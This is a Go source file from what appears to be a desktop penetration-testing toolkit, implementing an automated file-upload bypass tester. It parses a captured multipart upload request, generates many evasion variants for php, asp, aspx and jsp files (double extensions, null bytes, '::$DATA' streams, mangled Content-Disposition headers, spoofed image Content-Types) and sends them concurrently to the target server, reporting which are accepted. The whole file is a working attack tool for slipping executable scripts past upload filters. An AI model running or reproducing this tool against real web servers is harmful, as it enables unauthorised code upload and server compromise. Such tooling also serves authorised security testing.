package restmate

import (
	"EasyTools/app/controller/proxy"
	"bytes"
	"compress/gzip"
	"compress/zlib"
	"context"
	"fmt"
	"io"
	"net/http"
	"regexp"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/andybalholm/brotli"
	cookiejar "github.com/juju/persistent-cookiejar"
	"github.com/wailsapp/wails/v2/pkg/runtime"
)

// UploadBypassRequest 文件上传 bypass 请求结构
type UploadBypassRequest struct {
	RequestPacket string   `json:"requestPacket"` // 原始 HTTP 请求包
	Language      string   `json:"language"`      // 目标语言: all, php, asp, aspx, jsp
	ForceProtocol string   `json:"forceProtocol"` // 强制协议: 自动检测, HTTP, HTTPS
	ProxyHost     string   `json:"proxyHost"`     // 代理主机
	ProxyPort     string   `json:"proxyPort"`     // 代理端口
	Payloads      []string `json:"payloads"`      // 自定义 payloads（可选）
	Concurrency   int      `json:"concurrency"`   // 并发数
	RetryCount    int      `json:"retryCount"`    // 重试次数
}

// UploadBypassResult 单个 bypass 测试结果
type UploadBypassResult struct {
	Index          int    `json:"index"`
	Payload        string `json:"payload"`
	Status         int    `json:"status"`
	Response       string `json:"response"`
	ResponseSize   int    `json:"responseSize"`
	RequestPacket  string `json:"requestPacket"`
	ResponsePacket string `json:"responsePacket"`
}

// UploadBypassResponse bypass 测试响应
type UploadBypassResponse struct {
	Total   int                  `json:"total"`
	Success int                  `json:"success"`
	Failed  int                  `json:"failed"`
	Results []UploadBypassResult `json:"results"`
}

// RequestParts 解析后的请求部分
type RequestParts struct {
	ContentDisp      string
	ContentType      string
	FilenameBase     string
	FilenameExt      string
	OriginalFilename string
	Boundary         string
}

// GenerateUploadBypassPayloads 生成文件上传 bypass payloads
func GenerateUploadBypassPayloads(requestParts RequestParts, language string) []string {
	var payloads []string
	suffixes := []string{"php", "asp", "aspx", "jsp"}

	// 根据语言过滤
	if language != "all" {
		suffixes = []string{language}
	}

	// 1. 后缀绕过
	for _, suffix := range suffixes {
		payloads = append(payloads, generateSuffixBypass(requestParts, suffix)...)
	}

	// 2. Content-Disposition 绕过
	for _, suffix := range suffixes {
		payloads = append(payloads, generateContentDispositionBypass(requestParts, suffix)...)
	}

	// 3. Content-Type 绕过
	for _, suffix := range suffixes {
		payloads = append(payloads, generateContentTypeBypass(requestParts, suffix)...)
	}

	// 4. 特殊绕过技术
	for _, suffix := range suffixes {
		payloads = append(payloads, generateSpecialBypass(requestParts, suffix)...)
	}

	// 去重
	uniquePayloads := make(map[string]bool)
	var finalPayloads []string
	for _, p := range payloads {
		if !uniquePayloads[p] {
			uniquePayloads[p] = true
			finalPayloads = append(finalPayloads, p)
		}
	}

	return finalPayloads
}

// generateSuffixBypass 生成后缀绕过 payloads
func generateSuffixBypass(rp RequestParts, suffix string) []string {
	var payloads []string
	baseFilename := rp.FilenameBase
	if baseFilename == "" {
		baseFilename = "test"
	}

	suffixVariations := []string{
		suffix + ";.jpg",
		suffix + ".jpg",
		suffix + ";jpg",
		suffix + "/1.jpg",
		suffix + "%00.jpg",
		suffix + " .jpg",
		suffix + "_.jpg",
		suffix + ".jpg." + suffix,
		suffix + ".jpg/" + suffix,
		suffix + ".jpg\\",
		suffix + ".jpg::$DATA",
	}

	for _, variation := range suffixVariations {
		newFilename := fmt.Sprintf(`filename="%s.%s"`, baseFilename, variation)
		payload := strings.Replace(rp.ContentDisp, rp.OriginalFilename, newFilename, 1) + "\r\n" + rp.ContentType
		payloads = append(payloads, payload)
	}

	return payloads
}

// generateContentDispositionBypass 生成 Content-Disposition 绕过 payloads
func generateContentDispositionBypass(rp RequestParts, suffix string) []string {
	var payloads []string
	baseFilename := rp.FilenameBase
	if baseFilename == "" {
		baseFilename = "test"
	}

	newFilename := fmt.Sprintf(`filename="%s.%s"`, baseFilename, suffix)
	baseHeader := strings.Replace(rp.ContentDisp, rp.OriginalFilename, newFilename, 1) + "\r\n" + rp.ContentType

	// Content-Disposition 大小写变化
	variations := []string{
		strings.Replace(baseHeader, "Content-Disposition", "content-Disposition", 1),
		strings.Replace(baseHeader, "Content-Disposition: ", "content-Disposition:", 1),
		strings.Replace(baseHeader, "form-data", "~form-data", 1),
		strings.Replace(baseHeader, "form-data", "f+orm-data", 1),
	}

	payloads = append(payloads, variations...)

	// filename 变体
	filenameVariations := []string{
		fmt.Sprintf(`filename="%s.%s.jpg"`, baseFilename, suffix),
		fmt.Sprintf(`filename="%s.jpg.%s"`, baseFilename, suffix),
		fmt.Sprintf(`filename="%s.%s\n"`, baseFilename, suffix),
	}

	for _, variation := range filenameVariations {
		payload := strings.Replace(rp.ContentDisp, rp.OriginalFilename, variation, 1) + "\r\n" + rp.ContentType
		payloads = append(payloads, payload)
	}

	return payloads
}

// generateContentTypeBypass 生成 Content-Type 绕过 payloads
func generateContentTypeBypass(rp RequestParts, suffix string) []string {
	var payloads []string
	baseFilename := rp.FilenameBase
	if baseFilename == "" {
		baseFilename = "test"
	}

	newFilename := fmt.Sprintf(`filename="%s.%s"`, baseFilename, suffix)
	baseHeader := strings.Replace(rp.ContentDisp, rp.OriginalFilename, newFilename, 1) + "\r\n"

	contentTypeVariations := []string{
		"Content-Type: image/gif",
		"Content-Type: image/jpeg",
		"Content-Type: application/php",
		"Content-Type: text/plain",
		"Content-Type: image/png",
		"Content-Type: application/octet-stream",
		"Content-Type: application/x-httpd-php",
		"Content-Type: application/x-asp",
		strings.Replace(rp.ContentType, "Content-Type", "content-type", 1),
	}

	for _, ct := range contentTypeVariations {
		payloads = append(payloads, baseHeader+ct)
	}

	return payloads
}

// generateSpecialBypass 生成特殊绕过技术 payloads
func generateSpecialBypass(rp RequestParts, suffix string) []string {
	var payloads []string
	baseFilename := rp.FilenameBase
	if baseFilename == "" {
		baseFilename = "test"
	}
	ext := rp.FilenameExt
	if ext == "" {
		ext = "jpg"
	}

	// 引号变体
	newFilename := fmt.Sprintf(`filename="%s.%s"`, baseFilename, suffix)
	quoteVariations := []string{
		strings.Replace(newFilename, `"`, `'`, -1),
		strings.Replace(newFilename, `filename="`, `filename=`, 1),
		strings.Replace(newFilename, `"`, ``, -1),
	}

	for _, qv := range quoteVariations {
		payload := strings.Replace(rp.ContentDisp, rp.OriginalFilename, qv, 1) + "\r\n" + rp.ContentType
		payloads = append(payloads, payload)
	}

	// NULL 字节绕过
	nullBytes := []string{"%00", "\\0", "\\x00"}
	for _, nullByte := range nullBytes {
		nullFilename := fmt.Sprintf(`filename="%s.%s%s.%s"`, baseFilename, suffix, nullByte, ext)
		payload := strings.Replace(rp.ContentDisp, rp.OriginalFilename, nullFilename, 1) + "\r\n" + rp.ContentType
		payloads = append(payloads, payload)
	}

	// Windows 特性绕过
	winVariations := []string{
		fmt.Sprintf(`filename="%s.%s::$DATA"`, baseFilename, suffix),
		fmt.Sprintf(`filename="%s.%s;.jpg"`, baseFilename, suffix),
	}

	for _, wv := range winVariations {
		payload := strings.Replace(rp.ContentDisp, rp.OriginalFilename, wv, 1) + "\r\n" + rp.ContentType
		payloads = append(payloads, payload)
	}

	return payloads
}

// ExtractRequestParts 从原始 HTTP 请求中提取关键部分
func ExtractRequestParts(originalRequest string) (RequestParts, error) {
	var parts RequestParts

	// 分离头部和 body
	var headers, body string
	if strings.Contains(originalRequest, "\r\n\r\n") {
		parts := strings.SplitN(originalRequest, "\r\n\r\n", 2)
		headers = parts[0]
		if len(parts) > 1 {
			body = parts[1]
		}
	} else if strings.Contains(originalRequest, "\n\n") {
		parts := strings.SplitN(originalRequest, "\n\n", 2)
		headers = parts[0]
		if len(parts) > 1 {
			body = parts[1]
		}
	} else {
		headers = originalRequest
		body = ""
	}

	// 提取 boundary
	boundaryRegex := regexp.MustCompile(`boundary=([^\r\n;]+)`)
	boundaryMatch := boundaryRegex.FindStringSubmatch(headers)
	if len(boundaryMatch) < 2 {
		return parts, fmt.Errorf("未找到 boundary")
	}
	parts.Boundary = boundaryMatch[1]

	// 从 body 中提取文件部分
	bodyParts := strings.Split(body, "--"+parts.Boundary)
	var filePart string
	for _, part := range bodyParts {
		if strings.Contains(part, "filename=") && strings.Contains(part, "Content-Type:") {
			filePart = part
			break
		}
	}

	if filePart == "" {
		return parts, fmt.Errorf("未找到文件上传部分")
	}

	// 提取 Content-Disposition
	contentDispRegex := regexp.MustCompile(`(Content-Disposition:[^\r\n]+)`)
	contentDispMatch := contentDispRegex.FindStringSubmatch(filePart)
	if len(contentDispMatch) < 2 {
		return parts, fmt.Errorf("未找到 Content-Disposition")
	}
	parts.ContentDisp = contentDispMatch[1]

	// 提取 Content-Type
	contentTypeRegex := regexp.MustCompile(`(Content-Type:[^\r\n]+)`)
	contentTypeMatch := contentTypeRegex.FindStringSubmatch(filePart)
	if len(contentTypeMatch) < 2 {
		return parts, fmt.Errorf("未找到 Content-Type")
	}
	parts.ContentType = contentTypeMatch[1]

	// 提取文件名
	filenameRegex := regexp.MustCompile(`filename="([^"]+\.([^"]+))"`)
	filenameMatch := filenameRegex.FindStringSubmatch(parts.ContentDisp)
	if len(filenameMatch) >= 3 {
		parts.OriginalFilename = fmt.Sprintf(`filename="%s"`, filenameMatch[1])
		fullFilename := filenameMatch[1]
		lastDot := strings.LastIndex(fullFilename, ".")
		if lastDot > 0 {
			parts.FilenameBase = fullFilename[:lastDot]
			parts.FilenameExt = fullFilename[lastDot+1:]
		} else {
			parts.FilenameBase = fullFilename
			parts.FilenameExt = ""
		}
	} else {
		// 尝试不带扩展名的文件名
		filenameRegex2 := regexp.MustCompile(`filename="([^"]+)"`)
		filenameMatch2 := filenameRegex2.FindStringSubmatch(parts.ContentDisp)
		if len(filenameMatch2) >= 2 {
			parts.FilenameBase = filenameMatch2[1]
			parts.FilenameExt = ""
			parts.OriginalFilename = fmt.Sprintf(`filename="%s"`, filenameMatch2[1])
		} else {
			return parts, fmt.Errorf("无法解析文件名")
		}
	}

	return parts, nil
}

// ApplyPayloadToRequest 将 payload 应用到原始请求
func ApplyPayloadToRequest(originalRequest string, headerPayload string) string {
	// 分离头部和 body
	var headers, body string
	if strings.Contains(originalRequest, "\r\n\r\n") {
		parts := strings.SplitN(originalRequest, "\r\n\r\n", 2)
		headers = parts[0]
		if len(parts) > 1 {
			body = parts[1]
		}
	} else if strings.Contains(originalRequest, "\n\n") {
		parts := strings.SplitN(originalRequest, "\n\n", 2)
		headers = parts[0]
		if len(parts) > 1 {
			body = parts[1]
		}
	} else {
		return originalRequest
	}

	// 解析 payload
	payloadLines := strings.Split(strings.TrimSpace(headerPayload), "\r\n")
	if len(payloadLines) < 1 {
		return originalRequest
	}

	contentDispLine := payloadLines[0]
	contentTypeLine := ""
	if len(payloadLines) > 1 {
		contentTypeLine = payloadLines[1]
	}

	// 提取新文件名
	filenameRegex := regexp.MustCompile(`filename="([^"]+)"`)
	filenameMatch := filenameRegex.FindStringSubmatch(contentDispLine)
	if len(filenameMatch) < 2 {
		return originalRequest
	}
	newFilename := filenameMatch[1]

	// 提取 boundary
	boundaryRegex := regexp.MustCompile(`boundary=([^\r\n;]+)`)
	boundaryMatch := boundaryRegex.FindStringSubmatch(headers)
	if len(boundaryMatch) < 2 {
		return originalRequest
	}

	// 替换 body 中的 filename
	filenamePattern := regexp.MustCompile(`(filename=")([^"]+)(")`)
	updatedBody := filenamePattern.ReplaceAllStringFunc(body, func(match string) string {
		submatches := filenamePattern.FindStringSubmatch(match)
		if len(submatches) >= 4 {
			return submatches[1] + newFilename + submatches[3]
		}
		return match
	})

	// 替换 Content-Type（如果提供了）
	if contentTypeLine != "" {
		contentTypeValue := ""
		if strings.Contains(contentTypeLine, ": ") {
			parts := strings.SplitN(contentTypeLine, ": ", 2)
			if len(parts) >= 2 {
				contentTypeValue = parts[1]
			}
		}

		if contentTypeValue != "" {
			contentTypePattern := regexp.MustCompile(`(Content-Type: )([^\r\n]+)`)
			updatedBody = contentTypePattern.ReplaceAllStringFunc(updatedBody, func(match string) string {
				// 只替换第一个匹配的 Content-Type（在 filename 之后的）
				if strings.Contains(updatedBody[:strings.Index(updatedBody, match)], "filename=") {
					return "Content-Type: " + contentTypeValue
				}
				return match
			})
		}
	}

	return headers + "\r\n\r\n" + updatedBody
}

// SendBypassRequest 发送 bypass 请求
func (a *RestMate) SendBypassRequest(ctx context.Context, modifiedRequest string, forceProtocol string) (int, string, string, string, error) {
	// 分离头部和 body
	var headersSection, body string
	if strings.Contains(modifiedRequest, "\r\n\r\n") {
		parts := strings.SplitN(modifiedRequest, "\r\n\r\n", 2)
		headersSection = parts[0]
		if len(parts) > 1 {
			body = parts[1]
		}
	} else if strings.Contains(modifiedRequest, "\n\n") {
		parts := strings.SplitN(modifiedRequest, "\n\n", 2)
		headersSection = parts[0]
		if len(parts) > 1 {
			body = parts[1]
		}
	} else {
		return 0, "", "", "", fmt.Errorf("无效的请求格式")
	}

	headerLines := strings.Split(headersSection, "\n")
	if len(headerLines) == 0 {
		return 0, "", "", "", fmt.Errorf("空的头部部分")
	}

	// 解析请求行
	requestLine := strings.TrimSpace(headerLines[0])
	requestParts := strings.Fields(requestLine)
	if len(requestParts) < 2 {
		return 0, "", "", "", fmt.Errorf("无效的请求行格式: %s", requestLine)
	}

	method := requestParts[0]
	path := requestParts[1]

	// 解析头部
	headers := make(http.Header)
	for i := 1; i < len(headerLines); i++ {
		line := strings.TrimSpace(headerLines[i])
		if line == "" {
			continue
		}
		if strings.Contains(line, ": ") {
			parts := strings.SplitN(line, ": ", 2)
			if len(parts) >= 2 {
				headers.Set(parts[0], parts[1])
			}
		}
	}

	host := headers.Get("Host")
	if host == "" {
		host = "localhost"
	}

	// 确定协议
	isHTTPS := false
	if forceProtocol == "HTTPS" {
		isHTTPS = true
	} else if forceProtocol == "HTTP" {
		isHTTPS = false
	} else {
		// 自动检测
		isHTTPS = strings.Contains(host, ":443") || strings.HasSuffix(host, ":443") ||
			strings.Contains(strings.ToLower(modifiedRequest), "https") ||
			strings.Contains(strings.ToLower(headers.Get("Content-Type")), "ssl") ||
			strings.Contains(strings.ToLower(headers.Get("Content-Type")), "tls")
	}

	protocol := "https"
	if !isHTTPS {
		protocol = "http"
	}

	// 构建 URL
	requestURL := fmt.Sprintf("%s://%s%s", protocol, host, path)

	// 创建请求
	req, err := http.NewRequestWithContext(ctx, method, requestURL, strings.NewReader(body))
	if err != nil {
		return 0, "", "", "", err
	}

	// 设置头部
	for k, v := range headers {
		if len(v) > 0 {
			req.Header.Set(k, v[0])
		}
	}

	// 构建请求包字符串
	var reqBuilder strings.Builder
	reqBuilder.WriteString(fmt.Sprintf("%s %s %s\r\n", req.Method, req.URL.RequestURI(), req.Proto))
	reqBuilder.WriteString(fmt.Sprintf("Host: %s\r\n", req.Host))
	headerKeys := make([]string, 0, len(req.Header))
	for k := range req.Header {
		headerKeys = append(headerKeys, k)
	}
	sort.Strings(headerKeys)
	for _, k := range headerKeys {
		v := req.Header[k]
		for _, val := range v {
			reqBuilder.WriteString(fmt.Sprintf("%s: %s\r\n", k, val))
		}
	}
	reqBuilder.WriteString("\r\n")
	reqBuilder.WriteString(body)
	requestPacket := reqBuilder.String()

	// 创建 HTTP 客户端
	jar, err := cookiejar.New(&cookiejar.Options{Filename: a.jarFile})
	if err != nil {
		return 0, "", "", "", err
	}

	client := proxy.GlobalProxyManager.GetHTTPClient()
	cli := &http.Client{
		Jar:           jar,
		Transport:     client.Transport,
		Timeout:       client.Timeout,
		CheckRedirect: client.CheckRedirect,
	}

	// 发送请求
	response, err := cli.Do(req)
	if err != nil {
		return 0, "", requestPacket, "", err
	}
	defer response.Body.Close()

	// 读取响应体
	rawBuf, err := io.ReadAll(response.Body)
	if err != nil {
		return response.StatusCode, "", requestPacket, "", err
	}

	// 处理响应体解压
	bodyReader := bytes.NewReader(rawBuf)
	contentEncoding := strings.ToLower(strings.TrimSpace(response.Header.Get("Content-Encoding")))
	var decodedBody io.ReadCloser
	switch contentEncoding {
	case "gzip":
		if gr, err := gzip.NewReader(bodyReader); err == nil {
			decodedBody = gr
		}
	case "deflate":
		if zr, err := zlib.NewReader(bodyReader); err == nil {
			decodedBody = zr
		}
	case "br":
		decodedBody = io.NopCloser(brotli.NewReader(bodyReader))
	}

	var buf []byte
	if decodedBody != nil {
		defer decodedBody.Close()
		buf, err = io.ReadAll(decodedBody)
		if err != nil {
			buf = rawBuf
		}
	} else {
		buf = rawBuf
	}

	// 构建响应包字符串
	var respBuilder strings.Builder
	respBuilder.WriteString(fmt.Sprintf("%s %d %s\r\n", response.Proto, response.StatusCode, response.Status))
	respHeaderKeys := make([]string, 0, len(response.Header))
	for k := range response.Header {
		respHeaderKeys = append(respHeaderKeys, k)
	}
	sort.Strings(respHeaderKeys)
	for _, k := range respHeaderKeys {
		v := response.Header[k]
		for _, val := range v {
			respBuilder.WriteString(fmt.Sprintf("%s: %s\r\n", k, val))
		}
	}
	respBuilder.WriteString("\r\n")
	respBuilder.Write(buf)
	responsePacket := respBuilder.String()

	return response.StatusCode, string(buf), requestPacket, responsePacket, nil
}

// UploadBypassTest 执行文件上传 bypass 测试（异步，实时推送结果）
func (a *RestMate) UploadBypassTest(req UploadBypassRequest) (resp JSResp) {
	// 如果已有测试在进行，先取消
	if a.bypassTestCtx != nil {
		a.bypassTestCtx()
		a.bypassTestCtx = nil
	}

	// 提取请求部分
	requestParts, err := ExtractRequestParts(req.RequestPacket)
	if err != nil {
		resp.Msg = fmt.Sprintf("解析请求失败: %v", err)
		return
	}

	// 生成 payloads
	var payloads []string
	if len(req.Payloads) > 0 {
		payloads = req.Payloads
	} else {
		payloads = GenerateUploadBypassPayloads(requestParts, req.Language)
	}

	if len(payloads) == 0 {
		resp.Msg = "未生成任何 payload"
		return
	}

	// 验证并设置配置参数
	concurrency := req.Concurrency
	if concurrency <= 0 {
		concurrency = 10
	}
	if concurrency > 1000 {
		concurrency = 1000
	}
	retryCount := req.RetryCount
	if retryCount < 0 {
		retryCount = 0
	}
	if retryCount > 10 {
		retryCount = 10
	}

	// 创建 context
	ctx, cancel := context.WithCancel(a.ctx)
	a.bypassTestCtx = cancel

	// 在 goroutine 中执行测试
	go func() {
		defer func() {
			cancel()
			a.bypassTestCtx = nil
		}()

		successCount := 0
		failedCount := 0

		// 发送开始事件
		runtime.EventsEmit(a.ctx, "bypassTestStart", map[string]interface{}{
			"total": len(payloads),
		})

		// 使用并发控制发送请求
		sem := make(chan struct{}, concurrency) // 并发控制信号量
		var wg sync.WaitGroup
		var mu sync.Mutex // 保护共享数据
		results := make([]UploadBypassResult, len(payloads))

		// 速率限制：计算每个请求之间的间隔时间（毫秒）
		rateLimitInterval := time.Duration(1000/concurrency) * time.Millisecond
		if rateLimitInterval < 1 {
			rateLimitInterval = 1 * time.Millisecond
		}

		for i, payload := range payloads {
			// 检查是否已取消
			select {
			case <-ctx.Done():
				// 测试被取消
				runtime.EventsEmit(a.ctx, "bypassTestCancelled", map[string]interface{}{
					"total":   len(payloads),
					"success": successCount,
					"failed":  failedCount,
				})
				return
			default:
			}

			// 速率限制：等待适当的间隔
			if i > 0 {
				time.Sleep(rateLimitInterval)
			}

			wg.Add(1)
			sem <- struct{}{} // 获取信号量

			go func(idx int, pld string) {
				defer wg.Done()
				defer func() { <-sem }() // 释放信号量

				// 检查是否已取消
				select {
				case <-ctx.Done():
					return
				default:
				}

				// 发送测试开始事件
				runtime.EventsEmit(a.ctx, "bypassTestResult", map[string]interface{}{
					"index":   idx,
					"result":  nil, // 没有结果，表示测试开始
					"total":   len(payloads),
					"success": successCount,
					"failed":  failedCount,
				})

				// 执行请求（带重试）
				var status int
				var responseBody string
				var requestPacket string
				var responsePacket string
				var err error
				var lastErr error

				for retry := 0; retry <= retryCount; retry++ {
					// 检查是否已取消
					select {
					case <-ctx.Done():
						return
					default:
					}

					// 应用 payload 到请求
					modifiedRequest := ApplyPayloadToRequest(req.RequestPacket, pld)

					// 发送请求
					status, responseBody, requestPacket, responsePacket, err = a.SendBypassRequest(ctx, modifiedRequest, req.ForceProtocol)

					if err == nil && status >= 200 && status < 300 {
						// 成功，跳出重试循环
						break
					} else if err != nil {
						lastErr = err
						if retry < retryCount {
							// 继续重试
							continue
						}
					} else {
						// 状态码不在成功范围，但请求本身成功了
						if retry < retryCount {
							// 继续重试
							continue
						}
					}
				}

				result := UploadBypassResult{
					Index:          idx + 1,
					Payload:        pld,
					Status:         status,
					Response:       responseBody,
					ResponseSize:   len(responseBody),
					RequestPacket:  requestPacket,
					ResponsePacket: responsePacket,
				}

				if err != nil {
					result.Status = 0
					if lastErr != nil {
						result.Response = lastErr.Error()
					} else {
						result.Response = err.Error()
					}
				}

				// 更新结果到数组并更新统计
				mu.Lock()
				results[idx] = result
				if err == nil && status >= 200 && status < 300 {
					successCount++
				} else {
					failedCount++
				}
				currentSuccess := successCount
				currentFailed := failedCount
				mu.Unlock()

				// 实时推送单个测试结果
				runtime.EventsEmit(a.ctx, "bypassTestResult", map[string]interface{}{
					"index":   idx,
					"result":  result,
					"total":   len(payloads),
					"success": currentSuccess,
					"failed":  currentFailed,
				})
			}(i, payload)
		}

		// 等待所有goroutine完成
		wg.Wait()

		// 推送完成事件
		bypassResp := UploadBypassResponse{
			Total:   len(payloads),
			Success: successCount,
			Failed:  failedCount,
			Results: nil, // 结果已通过事件推送，这里不需要
		}
		runtime.EventsEmit(a.ctx, "bypassTestComplete", bypassResp)
	}()

	resp.Success = true
	resp.Msg = "测试已开始，请查看实时结果"
	return
}
